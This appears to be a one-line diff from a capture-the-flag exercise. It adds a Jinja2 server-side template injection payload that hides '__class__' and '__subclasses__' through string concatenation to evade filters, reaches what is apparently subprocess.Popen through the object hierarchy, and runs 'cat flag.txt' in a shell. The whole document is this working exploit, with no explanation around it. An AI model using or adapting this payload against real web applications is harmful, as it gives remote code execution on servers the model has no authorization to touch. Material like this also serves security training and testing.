@@ -1,0 +1,1 @@
+{{''["__cl" + "ass__"].__mro__[1]["__subcl" + "asses__"]()[360]('cat flag.txt',shell=True,stdout=-1).communicate()}}
